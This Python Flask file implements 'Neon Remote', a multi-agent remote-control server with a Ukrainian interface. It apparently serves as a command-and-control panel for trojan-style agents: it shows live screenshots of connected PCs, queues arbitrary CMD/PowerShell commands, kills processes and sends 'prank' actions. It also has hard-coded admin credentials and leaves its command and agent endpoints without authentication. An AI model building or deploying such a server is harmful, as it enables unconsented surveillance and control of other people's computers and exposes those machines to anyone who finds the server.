import os
import json
import time
import base64
from flask import Flask, render_template_string, request, redirect, session, jsonify, Response

app = Flask(__name__)
app.secret_key = "neon_super_secret_key_change_me"

ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "pro"
USERS_FILE = "users.json"

def load_users():
    if not os.path.exists(USERS_FILE):
        users = {
            ADMIN_USERNAME: {
                "password": ADMIN_PASSWORD,
                "permissions": ["admin", "screen", "files", "commands", "processes", "camera", "network", "remote"],
            }
        }
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, indent=2)
        return users
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

# --- Стан Агентів (Багато клієнтів) ---
AGENTS = {}
COMMAND_QUEUES = {}

# --- HTML ШАБЛОНИ ---
LOGIN_TEMPLATE = r"""
<!doctype html>
<html lang="uk">
<head>
<meta charset="utf-8">
<title>Вхід — Neon Remote</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
body{background:#06060b;color:#0ff;font-family:'Inter',Arial;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
.box{background:#0b0b12;padding:40px;border-radius:12px;box-shadow:0 0 40px rgba(0,255,208,0.2);width:100%;max-width:380px;border:1px solid rgba(0,255,208,0.3);}
input{display:block;margin:10px 0 20px 0;padding:14px;border-radius:6px;border:1px solid #00ffd0;background:#071018;color:#0ff;width:100%;box-sizing:border-box;outline:none;}
button{padding:14px;border-radius:6px;border:1px solid #00ffd0;background:#001a1a;color:#0ff;cursor:pointer;width:100%;font-weight:bold;text-transform:uppercase;transition:0.3s;}
button:hover{background:#00ffd0;color:#000;}
.title{font-weight:800;font-size:24px;margin-bottom:20px;text-align:center;letter-spacing:1px;}
.msg{color:#ff4d4d;margin-bottom:15px;text-align:center;font-size:14px;}
</style>
</head>
<body>
<div class="box">
  <div class="title">NEON SYSTEM</div>
  {% if msg %}<div class="msg">{{ msg }}</div>{% endif %}
  <form method="POST">
    <input name="username" placeholder="Логін (admin)" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Увійти</button>
  </form>
</div>
</body>
</html>
"""

MAIN_TEMPLATE = r"""
<!doctype html>
<html lang="uk">
<head>
<meta charset="utf-8">
<title>Neon Remote — Dashboard</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
:root { --neon: #00ffd0; --bg: #05060d; --panel: rgba(10, 15, 30, 0.6); --border: rgba(255, 255, 255, 0.08); }
* { box-sizing: border-box; }
body { margin: 0; background: var(--bg); color: var(--neon); font-family: 'Inter', sans-serif; overflow: hidden; display: flex; height: 100vh; }

/* Ліва панель: Список агентів */
.sidebar { width: 280px; background: rgba(0,0,0,0.92); border-right: 1px solid var(--border); padding: 20px; display: flex; flex-direction: column; z-index: 10; }
.sidebar h2 { margin-top: 0; font-size: 18px; color: #fff; text-transform: uppercase; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
.agent-list { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
.agent-item { padding: 12px; border: 1px solid var(--border); border-radius: 8px; cursor: pointer; transition: 0.3s; background: var(--panel); color: #fff; display: flex; justify-content: space-between; align-items: center; }
.agent-item:hover { border-color: var(--neon); box-shadow: 0 0 10px rgba(0, 255, 208, 0.2); }
.agent-item.active { background: rgba(0, 255, 208, 0.1); border-color: var(--neon); color: var(--neon); font-weight: bold; }
.status-dot { width: 10px; height: 10px; border-radius: 50%; background: #ff4d4d; box-shadow: 0 0 8px #ff4d4d; }
.status-dot.online { background: #00ff66; box-shadow: 0 0 8px #00ff66; }

/* Головний контент */
.main-col { flex: 1; padding: 30px; overflow-y: auto; position: relative; }
.card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin-bottom: 20px; backdrop-filter: blur(10px); }
.card b { display: block; margin-bottom: 15px; font-size: 16px; text-transform: uppercase; color: #fff; }
.btn { border: 1px solid var(--neon); background: rgba(0,0,0,0.3); color: var(--neon); padding: 10px 16px; border-radius: 10px; cursor: pointer; transition: 0.3s; font-weight: 600; text-decoration: none; display: inline-block; width: 100%; text-align: center; }
.btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }

textarea { width: 100%; height: 80px; background: rgba(0,0,0,0.5); color: #fff; border: 1px solid var(--border); border-radius: 10px; padding: 12px; outline: none; font-family: monospace; }
pre { background: rgba(0,0,0,0.8); padding: 15px; border-radius: 10px; overflow-x: auto; color: #aaa; font-family: monospace; border: 1px solid var(--border); max-height: 250px; }
img.screen { width: 100%; border-radius: 10px; border: 1px solid var(--border); display: block; min-height: 300px; background: #000; object-fit: contain; }

/* Права панель (Виїжджає при наведенні) */
.right-panel { position: fixed; top: 0; right: -320px; width: 320px; height: 100vh; background: #0f172a; border-left: 1px solid #334155; padding: 20px; transition: right 0.3s ease; z-index: 9999; display: flex; flex-direction: column; overflow-y: auto; }
.right-panel::before { content: ""; position: absolute; left: -30px; top: 0; width: 30px; height: 100%; }
.right-panel:hover { right: 0; }
.stat-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-weight: 600; color: #fff; font-size: 14px; }
.bar { height: 8px; background: rgba(0,0,0,0.5); border-radius: 4px; overflow: hidden; margin-bottom: 20px; }
.bar div { height: 100%; width: 0%; background: var(--neon); transition: width 0.3s ease; box-shadow: 0 0 10px var(--neon); }

/* Placeholder, коли не вибрано агента */
.no-agent { display: flex; height: 100%; align-items: center; justify-content: center; color: #888; font-size: 20px; text-transform: uppercase; }
</style>
</head>
<body>

<!-- ЛІВА ПАНЕЛЬ -->
<div class="sidebar">
  <div style="display: flex; justify-content: space-between; align-items: center;">
    <h2>Клієнти</h2>
    <a href="/logout" style="color:#ff4d4d; font-size:12px; text-decoration:none;">ВИЙТИ</a>
  </div>
  <div class="agent-list" id="agentList">
    <!-- Сюди JS завантажить агентів -->
  </div>
</div>

<!-- ГОЛОВНИЙ ЕКРАН -->
<div class="main-col" id="mainCol">
  <div class="no-agent">⬅ Виберіть комп'ютер зі списку зліва</div>
</div>

<!-- ПРАВА ПАНЕЛЬ (статистика і пранки) -->
<div class="right-panel" id="rightPanel" style="display: none;">
  <h3 style="color: #fff; margin-top: 0; border-bottom: 1px solid #334155; padding-bottom: 10px;">Панель керування</h3>
  
  <div class="stat-header">CPU ПК <span id="cpuVal">0%</span></div>
  <div class="bar"><div id="cpuBar"></div></div>

  <div class="stat-header">RAM ПК <span id="ramVal">0%</span></div>
  <div class="bar"><div id="ramBar"></div></div>

  <div style="margin-bottom: 20px;">
    <div class="stat-header">Гучність ПК</div>
    <div style="display:flex; align-items:center; gap:15px;">
      <input type="range" min="0" max="100" value="50" id="volumeSlider" style="flex:1; cursor:pointer;">
      <span id="volumeVal" style="font-weight:600; color:#fff;">50%</span>
    </div>
  </div>

  <b style="color: #fff; display: block; margin-bottom: 10px;">Швидкі Пранки</b>
  <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
    <button class="btn" style="font-size:12px;" onclick="sendTroll('beep')">🔊 Beep</button>
    <button class="btn" style="font-size:12px;" onclick="sendTroll('msg')">💬 Повідомлення</button>
  </div>
  
  <b style="color: #fff; display: block; margin: 20px 0 10px;">Менеджер</b>
  <button class="btn" onclick="openProcesses()">⚙️ Процеси</button>
  
  <div style="margin-top: auto; font-size: 12px; color: #666; text-align: center;">Наведи мишку, щоб відкрити панель</div>
</div>

<script>
let currentHwid = null;

// Завантажує список підключених ПК
async function fetchAgents() {
  try {
    const r = await fetch('/api/agents');
    const agents = await r.json();
    const list = document.getElementById('agentList');
    
    if (agents.length === 0) {
      list.innerHTML = '<div style="color:#666; font-size:12px; text-align:center;">Немає активних агентів</div>';
      return;
    }

    list.innerHTML = agents.map(a => `
      <div class="agent-item ${currentHwid === a.hwid ? 'active' : ''}" onclick="selectAgent('${a.hwid}')">
        <span>${a.hostname}</span>
        <div class="status-dot ${a.online ? 'online' : ''}"></div>
      </div>
    `).join('');
    
    // Якщо вибраного агента ще немає, вибираємо першого
    if (!currentHwid && agents.length > 0) {
      selectAgent(agents[0].hwid);
    }
  } catch(e){}
}

// Вибір конкретного ПК
function selectAgent(hwid) {
  currentHwid = hwid;
  document.getElementById('rightPanel').style.display = 'flex';
  
  document.getElementById('mainCol').innerHTML = `
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
        <b style="margin:0;">Екран ПК: ${hwid}</b>
        <span id="agentStatus" class="status-dot online"></span>
      </div>
      <img id="screenImg" src="" class="screen">
    </div>

    <div class="card">
      <b>Консоль Команд (CMD / PowerShell)</b>
      <form id="cmdForm" onsubmit="sendCmd(event)">
        <textarea id="cmdInput" placeholder="Введіть команду (наприклад: dir або whoami)..."></textarea>
        <button type="submit" class="btn" style="margin-top:10px; width:auto;">Виконати на ПК</button>
      </form>
      <pre id="cmdOutput">Очікування результату...</pre>
    </div>
  `;
  
  fetchAgents(); // Щоб оновити клас "active" в списку
}

// Оновлення статистики обраного ПК
async function updateStats(){
  if (!currentHwid) return;
  try {
    const r = await fetch('/api/system?hwid=' + encodeURIComponent(currentHwid));
    const d = await r.json();
    
    if (d.error) return;

    document.getElementById('cpuBar').style.width = d.cpu + "%";
    document.getElementById('ramBar').style.width = d.ram + "%";
    document.getElementById('cpuVal').innerText = d.cpu + "%";
    document.getElementById('ramVal').innerText = d.ram + "%";
    
    const statusEl = document.getElementById('agentStatus');
    if (statusEl) {
      statusEl.className = d.online ? "status-dot online" : "status-dot";
    }
    
    if (d.cmd_output && document.getElementById('cmdOutput')) {
      document.getElementById('cmdOutput').innerText = d.cmd_output;
    }
  } catch(e){}
}

// Оновлення картинки екрана
function updateScreen() {
  if (!currentHwid) return;
  const img = document.getElementById('screenImg');
  if (img) {
    img.src = "/api/screen.jpg?hwid=" + encodeURIComponent(currentHwid) + "&t=" + new Date().getTime();
  }
}

// Відправка команди
async function sendCmd(e) {
  e.preventDefault();
  if (!currentHwid) return;
  const cmd = document.getElementById('cmdInput').value;
  if(!cmd) return;
  
  await fetch('/api/run_cmd', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ hwid: currentHwid, cmd: cmd })
  });
  
  document.getElementById('cmdInput').value = '';
  document.getElementById('cmdOutput').innerText = 'Команду відправлено...';
}

// Гучність
const volSlider = document.getElementById('volumeSlider');
if (volSlider) {
  volSlider.addEventListener('change', () => {
    if (!currentHwid) return;
    document.getElementById('volumeVal').innerText = volSlider.value + '%';
    fetch('/api/volume', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ hwid: currentHwid, value: volSlider.value })
    });
  });
}

// Відправка пранку
function sendTroll(action) {
  if (!currentHwid) return;
  fetch('/api/troll', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ hwid: currentHwid, action: action })
  });
}

// Процеси (тимчасово алерт для спрощення, або можна зробити окрему сторінку)
function openProcesses() {
  if (!currentHwid) return;
  window.location.href = '/processes?hwid=' + encodeURIComponent(currentHwid);
}

// Цикли оновлення
setInterval(fetchAgents, 3000);
setInterval(updateStats, 1500);
setInterval(updateScreen, 2000);
fetchAgents(); // Перший запуск
</script>
</body>
</html>
"""

PROCESSES_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="utf-8">
<title>Процеси — Neon Remote</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
:root { --neon: #00ffd0; --bg: #05060d; --panel: rgba(10, 15, 30, 0.6); --border: rgba(255, 255, 255, 0.08); }
body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); color: var(--neon); padding: 30px; }
.btn { border: 1px solid var(--neon); background: transparent; color: var(--neon); padding: 8px 16px; border-radius: 10px; cursor: pointer; text-decoration: none; display: inline-block; }
.card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; backdrop-filter: blur(10px); }
table { width: 100%; border-collapse: collapse; text-align: left; margin-top: 15px; font-size: 14px; }
th, td { padding: 12px; border-bottom: 1px solid var(--border); color: #ccc; }
th { color: var(--neon); text-transform: uppercase; }
.action-btn { background: transparent; border: 1px solid #ff4d4d; color: #ff4d4d; padding: 6px 10px; border-radius: 6px; cursor: pointer; }
.action-btn:hover { background: #ff4d4d; color: #fff; }
</style>
</head>
<body>
<a href="/" class="btn" style="margin-bottom: 20px;">⬅ На головну</a>
<div class="card">
  <h2>Менеджер процесів ПК: <span id="pcName"></span></h2>
  <table>
    <thead><tr><th>PID</th><th>Назва</th><th>Дії</th></tr></thead>
    <tbody id="plist"><tr><td colspan="3">Завантаження...</td></tr></tbody>
  </table>
</div>
<script>
const urlParams = new URLSearchParams(window.location.search);
const currentHwid = urlParams.get('hwid');
document.getElementById('pcName').innerText = currentHwid;

async function loadProc(){
  if(!currentHwid) return;
  const r = await fetch('/api/processes?hwid=' + encodeURIComponent(currentHwid));
  const data = await r.json();
  const tbody = document.getElementById('plist');
  if(data.error || !data.length) { tbody.innerHTML = '<tr><td colspan="3">Немає даних від Агента</td></tr>'; return; }
  
  tbody.innerHTML = data.map(p => `
    <tr>
      <td>${p.pid}</td>
      <td style="color:#fff;">${p.name}</td>
      <td><button class="action-btn" onclick="killProc(${p.pid})">❌ Завершити</button></td>
    </tr>
  `).join('');
}

function killProc(pid){
  fetch('/api/process/kill', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ hwid: currentHwid, pid: pid })
  }).then(() => setTimeout(loadProc, 1000));
}

loadProc();
</script>
</body>
</html>
"""

# --- WEB ROUTES ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        users = load_users()
        u = request.form.get('username')
        p = request.form.get('password')
        if u in users and users[u]['password'] == p:
            session['user'] = u
            return redirect('/')
        return render_template_string(LOGIN_TEMPLATE, msg="Невірний логін або пароль")
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect('/login')

@app.route('/')
def main():
    if 'user' not in session: return redirect('/login')
    return render_template_string(MAIN_TEMPLATE)

@app.route('/processes')
def processes_page():
    if 'user' not in session: return redirect('/login')
    return render_template_string(PROCESSES_TEMPLATE)

# --- CLIENT API ENDPOINTS (Для Веб-Інтерфейсу) ---
@app.route('/api/agents')
def api_agents():
    now = time.time()
    res = []
    for hwid, data in AGENTS.items():
        is_online = (now - data['last_seen']) < 10
        res.append({
            'hwid': hwid,
            'hostname': data.get('hostname', hwid),
            'online': is_online
        })
    return jsonify(res)

@app.route('/api/system')
def api_system():
    hwid = request.args.get('hwid')
    if not hwid or hwid not in AGENTS: return jsonify({'error': 'Agent not found'})
    agent = AGENTS[hwid]
    online = (time.time() - agent['last_seen']) < 10
    return jsonify({
        'cpu': agent.get('cpu', 0),
        'ram': agent.get('ram', 0),
        'online': online,
        'cmd_output': agent.get('cmd_output', 'Очікування команд...')
    })

@app.route('/api/screen.jpg')
def api_screen():
    hwid = request.args.get('hwid')
    if hwid in AGENTS and AGENTS[hwid].get('screenshot'):
        return Response(AGENTS[hwid]['screenshot'], mimetype='image/jpeg')
    return Response(b'', mimetype='image/jpeg')

@app.route('/api/run_cmd', methods=['POST'])
def api_run_cmd():
    hwid = request.json.get('hwid')
    cmd = request.json.get('cmd')
    if hwid and cmd:
        if hwid not in COMMAND_QUEUES: COMMAND_QUEUES[hwid] = []
        COMMAND_QUEUES[hwid].append({'type': 'cmd', 'payload': cmd})
    return jsonify({'status': 'queued'})

@app.route('/api/volume', methods=['POST'])
def api_volume():
    hwid = request.json.get('hwid')
    val = request.json.get('value')
    if hwid and val is not None:
        if hwid not in COMMAND_QUEUES: COMMAND_QUEUES[hwid] = []
        COMMAND_QUEUES[hwid].append({'type': 'volume', 'payload': val})
    return jsonify({'status': 'queued'})

@app.route('/api/troll', methods=['POST'])
def api_troll():
    hwid = request.json.get('hwid')
    action = request.json.get('action')
    if hwid and action:
        if hwid not in COMMAND_QUEUES: COMMAND_QUEUES[hwid] = []
        COMMAND_QUEUES[hwid].append({'type': 'troll', 'payload': action})
    return jsonify({'status': 'queued'})

@app.route('/api/processes')
def api_processes():
    hwid = request.args.get('hwid')
    if not hwid or hwid not in AGENTS: return jsonify([])
    return jsonify(AGENTS[hwid].get('processes', []))

@app.route('/api/process/kill', methods=['POST'])
def api_kill_process():
    hwid = request.json.get('hwid')
    pid = request.json.get('pid')
    if hwid and pid:
        if hwid not in COMMAND_QUEUES: COMMAND_QUEUES[hwid] = []
        COMMAND_QUEUES[hwid].append({'type': 'kill_proc', 'payload': pid})
    return jsonify({'status': 'queued'})

# --- AGENT API (Зв'язок із ПК) ---
@app.route('/api/agent/report', methods=['POST'])
def agent_report():
    data = request.json or {}
    hwid = data.get('hwid')
    if not hwid: return jsonify({'error': 'No HWID'}), 400

    if hwid not in AGENTS:
        AGENTS[hwid] = {}
        COMMAND_QUEUES[hwid] = []

    # Оновлюємо стан конкретного ПК
    AGENTS[hwid]['last_seen'] = time.time()
    AGENTS[hwid]['hostname'] = data.get('hostname', 'Unknown')
    AGENTS[hwid]['cpu'] = data.get('cpu', 0)
    AGENTS[hwid]['ram'] = data.get('ram', 0)
    AGENTS[hwid]['processes'] = data.get('processes', [])
    
    img_b64 = data.get('screenshot')
    if img_b64:
        AGENTS[hwid]['screenshot'] = base64.b64decode(img_b64)
        
    cmd_out = data.get('cmd_output')
    if cmd_out:
        AGENTS[hwid]['cmd_output'] = cmd_out
        
    # Віддаємо чергу команд ДЛЯ ЦЬОГО ПК
    pending_cmds = list(COMMAND_QUEUES.get(hwid, []))
    COMMAND_QUEUES[hwid] = []
    
    return jsonify({'commands': pending_cmds})

if __name__ == '__main__':
    print("🚀 Мульти-Сервер запущено на http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
